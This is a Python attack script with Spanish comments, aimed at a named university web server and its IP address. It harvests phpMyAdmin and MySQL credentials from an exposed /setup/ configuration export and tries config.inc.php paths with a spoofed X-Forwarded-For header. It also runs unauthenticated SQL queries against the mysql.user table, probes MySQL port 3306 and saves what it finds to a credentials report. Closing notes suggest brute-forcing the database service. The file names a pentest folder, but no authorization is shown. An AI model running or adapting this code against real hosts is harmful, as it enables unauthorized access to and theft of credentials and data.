#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FASE FINAL - Obtener credenciales reales de configuracion /setup/
"""

import requests
from urllib.parse import urlparse
import re
import json
import sys
import urllib3
urllib3.disable_warnings()

TARGET = "https://orcl.uns.edu.pe"
scheme = "https"
base_url = f"{scheme}://{urlparse(TARGET).netloc}"
session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": base_url + "/",
})

print("=" * 70)
print("  FASE FINAL - Obteniendo Credenciales Reales")
print("=" * 70)

results = {}

# ============================================
# 1. Leer config export de /setup/
# ============================================
print("\n[1] Leyendo configuracion exportada desde /setup/")
try:
    r = session.get(f"{base_url}/setup/index.php?page=config", timeout=10)
    if r.status_code == 200:
        print(f"  [+] Config export HTTP {r.status_code} ({len(r.text)} bytes)")
        print(f"  [+] Guardando contenido completo...")
        
        # Guardar archivo completo
        with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\setup_config_export.html", "w") as f:
            f.write(r.text)
        
        # Buscar credenciales en el HTML
        # Buscar patron de configuracion de phpMyAdmin
        # $cfg['Servers'][$i]['host'] = '...'
        # $cfg['Servers'][$i]['user'] = '...'
        # $cfg['Servers'][$i]['password'] = '...'
        
        patterns = {
            'host': r"Servers.*?host.*?['\"]([^'\"]+)['\"]",
            'port': r"Servers.*?port.*?(\d+)",
            'user': r"Servers.*?user.*?['\"]([^'\"]+)['\"]",
            'password': r"Servers.*?password.*?['\"]([^'\"]*)['\"]",
            'socket': r"Servers.*?socket.*?['\"]([^'\"]+)['\"]",
            'auth_type': r"Servers.*?auth_type.*?['\"]([^'\"]+)['\"]",
            'controluser': r"Servers.*?controluser.*?['\"]([^'\"]+)['\"]",
            'controlpass': r"Servers.*?controlpass.*?['\"]([^'\"]+)['\"]",
            'blowfish': r"blowfish_secret.*?['\"]([^'\"]+)['\"]",
            'AllowNoPassword': r"AllowNoPassword.*?(true|false)",
            'OnlyDB': r"only_db.*?['\"]([^'\"]+)['\"]",
        }
        
        found_creds = []
        for name, pattern in patterns.items():
            matches = re.findall(pattern, r.text, re.IGNORECASE | re.DOTALL)
            if matches:
                for m in matches[:5]:
                    val = str(m).strip()
                    if val and len(val) < 100:
                        print(f"  [+] {name}: {val}")
                        found_creds.append((name, val))
                        results[f'config_{name}'] = val
        
        # Buscar TODAS las lineas que contengan credenciales o configuracion
        print(f"\n  [+] Lineas con credenciales/configuracion:")
        for i, line in enumerate(r.text.split('\n'), 1):
            line_clean = line.strip()
            if any(kw in line_clean.lower() for kw in ['password', 'user', 'auth', 'host', 'blowfish', 'secret', 'config', 'credential', 'control']):
                if len(line_clean) > 3 and len(line_clean) < 250:
                    print(f"    Linea {i}: {line_clean}")
                    results[f'line_{i}'] = line_clean

except Exception as e:
    print(f"  [-] Error: {e}")

# ============================================
# 2. Leer el config.inc.php real (con headers diferentes)
# ============================================
print("\n\n[2] Intentando leer config.inc.php con diferentes enfoques")

# Intentar diferentes formas de obtener el contenido
config_attempts = [
    {"url": f"{base_url}/config.inc.php", "headers": {"Accept": "text/plain"}},
    {"url": f"{base_url}/config.inc.php", "headers": {"X-Forwarded-For": "127.0.0.1"}},
    {"url": f"{base_url}/config.php", "headers": {"Accept": "text/plain"}},
    {"url": f"{base_url}/inc/config.inc.php", "headers": {"Accept": "text/plain"}},
    {"url": f"{base_url}/phpMyAdmin/config.inc.php", "headers": {"Accept": "text/plain"}},
    {"url": f"{base_url}/pma/config.inc.php", "headers": {"Accept": "text/plain"}},
]

for attempt in config_attempts:
    try:
        r = session.get(attempt["url"], headers=attempt["headers"], timeout=5)
        if r.status_code == 200 and len(r.text) > 10:
            print(f"  [+] {attempt['url']} -> HTTP {r.status_code} ({len(r.text)} bytes)")
            # Buscar credenciales
            for line in r.text.split('\n')[:50]:
                if any(kw in line.lower() for kw in ['password', 'user', 'auth', 'secret', 'host']):
                    if len(line.strip()) > 2:
                        print(f"    -> {line.strip()[:200]}")
                        results[f'found_config_{attempt["url"]}'] = line.strip()[:200]
        elif r.status_code == 200 and len(r.text) == 0:
            pass  # Vacio como antes
    except Exception:
        pass

# ============================================
# 3. Intentar conexion directa a MySQL para ver credenciales
# ============================================
print("\n\n[3] Intentando conexion a MySQL 3306")

# Intentar con python-mysql o socket approach
# Primero, ver que pasa cuando intentamos autenticarnos
# Usando el modulo socket de python
import socket

def test_mysql_connection(host, port=3306, timeout=3):
    """Intenta conectar a MySQL para verificar si el puerto esta abierto"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        # MySQL envia un banner de bienvenida
        banner = s.recv(1024)
        s.close()
        return True, banner[:200]
    except Exception as e:
        return False, str(e)

print("  Probando conexion MySQL directa...")
success, info = test_mysql_connection("190.119.171.165")
if success:
    print(f"  [+] MySQL 3306 ABIERTO! Banner: {info}")
    results['mysql_banner'] = str(info)
else:
    print(f"  [-] MySQL: {info}")
    # Verificar si el puerto esta filtrado o cerrado
    results['mysql_status'] = info

# ============================================
# 4. Intentar acceder a /server_privileges.php 
# ============================================
print("\n\n[4] Intentando acceder a paginas de privilegios")

# Estas paginas muestran informacion de usuarios si se tienen permisos
# Pero podriamos intentar con session que tenemos

privilege_pages = [
    "/server_privileges.php",
    "/server_user_groups.php", 
    "/server_variables.php",
    "/server_status.php",
    "/server_databases.php",
    "/db_sql.php?db=mysql&table=user",
    "/sql.php?server=1&sql_query=SELECT+User+FROM+mysql.user",
]

# Intentar acceder con nuestra sesion activa
for page in privilege_pages:
    try:
        r = session.get(f"{base_url}{page}", timeout=5)
        if r.status_code == 200 and len(r.text) > 200:
            # Buscar datos de usuarios
            # Buscar rows con datos de usuarios MySQL
            user_data = re.findall(r'(root|admin|pma|uns|sistema|usuarios?|super|backup)', r.text, re.IGNORECASE)
            if user_data:
                print(f"  [+] {page} -> Datos encontrados: {set(user_data)}")
                results[f'privileges_{page.replace("/", "_")}'] = list(set(user_data))
            elif 'login' in r.text.lower() and 'logout' not in r.text.lower():
                pass  # Requiere login
            else:
                print(f"  [+] {page} -> HTTP 200 ({len(r.text)} bytes)")
                # Buscar cualquier texto relevante
                if 'database' in r.text.lower() or 'table' in r.text.lower():
                    print(f"    Contiene datos de BD")
                    results[f'data_{page.replace("/", "_")}'] = "DATA_PRESENT"
    except Exception as e:
        pass

# ============================================
# 5. Intentar con /sql.php sin parametros
# ============================================
print("\n\n[5] Probando /sql.php con diferentes parametros")

# sql.php acepta GET params para ejecutar queries
# Algunas versiones muestran resultados sin login

sql_tests = [
    "SELECT User(), Database()",
    "SELECT VERSION()",
    "SELECT @@version",
    "SELECT CURRENT_USER()",
    "SELECT USER(), CURRENT_USER(), @@version, @@hostname",
    "SELECT CONCAT(user, '@', host) FROM mysql.user WHERE user='root'",
]

for query in sql_tests:
    try:
        encoded = requests.utils.quote(query)
        url = f"{base_url}/sql.php?server=1&sql_query={encoded}&go=Go"
        r = session.get(url, timeout=5)
        if r.status_code == 200 and len(r.text) > 100:
            # Verificar si la query funciono
            if 'error' not in r.text.lower() or 'result' in r.text.lower() or '<td' in r.text:
                print(f"  [+] Query exitosa: {query[:50]}...")
                # Extraer resultados de la tabla
                td_matches = re.findall(r'<td[^>]*>([^<]+)</td>', r.text)
                if td_matches:
                    print(f"    Resultado: {td_matches}")
                    results[f'sql_result_{query[:20]}'] = td_matches[:5]
            else:
                print(f"  [!] Query fallida: {query[:50]}...")
    except Exception as e:
        pass

# ============================================
# 6. Intentar /server_status.php para info del sistema
# ============================================
print("\n\n[6] Intentando obtener info del sistema")

# Intentar acceder a /server_status.php que puede mostrar variables del sistema
try:
    r = session.get(f"{base_url}/server_status.php", timeout=5)
    if r.status_code == 200 and len(r.text) > 200:
        # Buscar variables del sistema MySQL
        vars_found = re.findall(r'<th[^>]*>([^<]+)</th>', r.text)
        if vars_found:
            print(f"  [+] Variables del sistema: {vars_found[:10]}")
            results['server_status_vars'] = vars_found[:10]
        
        # Buscar valores
        values = re.findall(r'<td[^>]*>([^<]+)</td>', r.text)
        if values:
            print(f"  [+] Valores encontrados: {values[:10]}")
            results['server_status_values'] = values[:10]
except Exception as e:
    pass

# ============================================
# 7. Leer el HTML completo de /setup/ 
# ============================================
print("\n\n[7] Analizando HTML completo de /setup/ para rutas ocultas")

try:
    r = session.get(f"{base_url}/setup/index.php", timeout=5)
    if r.status_code == 200:
        # Buscar todos los formularios y sus acciones
        forms = re.findall(r'<form[^>]*action=["\']?([^"\'\s>]+)["\']?', r.text)
        print(f"  [+] Formularios en /setup/: {forms}")
        results['setup_forms'] = forms
        
        # Buscar todos los inputs ocultos
        hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\']', r.text)
        print(f"  [+] Hidden inputs: {hidden_inputs}")
        results['setup_hidden_inputs'] = hidden_inputs
        
        # Buscar links
        all_links = re.findall(r'href=["\']([^"\']+)["\']', r.text)
        interesting_links = [l for l in all_links if any(kw in l.lower() for kw in ['config', 'server', 'export', 'import', 'save', 'auth'])]
        print(f"  [+] Links interesantes: {interesting_links}")
        results['setup_interesting_links'] = interesting_links
        
        # Buscar JavaScript que contenga configuracion
        js_blocks = re.findall(r'<script[^>]*>(.*?)</script>', r.text, re.DOTALL)
        for js in js_blocks:
            if 'cfg[' in js or 'Servers' in js or 'config' in js:
                # Buscar valores de configuracion
                cfg_vals = re.findall(r"cfg\[Servers\]\[1\]\[(\w+)\]\s*=\s*['\"]([^'\"]+)['\"]", js)
                if cfg_vals:
                    print(f"  [+] Configuracion en JS encontrada:")
                    for k, v in cfg_vals:
                        print(f"    cfg[Servers][1][{k}] = '{v}'")
                        results[f'js_cfg_{k}'] = v
except Exception as e:
    pass

# ============================================
# RESUMEN FINAL
# ============================================
print("\n" + "=" * 70)
print("  RESUMEN FINAL DE CREDENCIALES")
print("=" * 70)
print(f"\n  Total de hallazgos: {len(results)}")
print(f"\n  CREDENCIALES Y DATOS ENCONTRADOS:")
for k, v in sorted(results.items()):
    if v and str(v) != 'None':
        print(f"    {k}: {v}")

# Guardar
with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\reporte_credenciales_final.json", "w") as f:
    json.dump(results, f, indent=2)
print(f"\n  Reporte final: reporte_credenciales_final.json")

print("\n\n  NOTA PARA INFORME:")
print("  - Si la configuracion exportada contiene credenciales REALES,")
print("    eso es la prueba definitiva de explotacion.")
print("  - Si MySQL 3306 esta visible, se puede intentar brute force")
print("    directamente contra el servicio MySQL (no solo via web).")
print("  - La combinacion de /setup/ + config export = acceso total.")
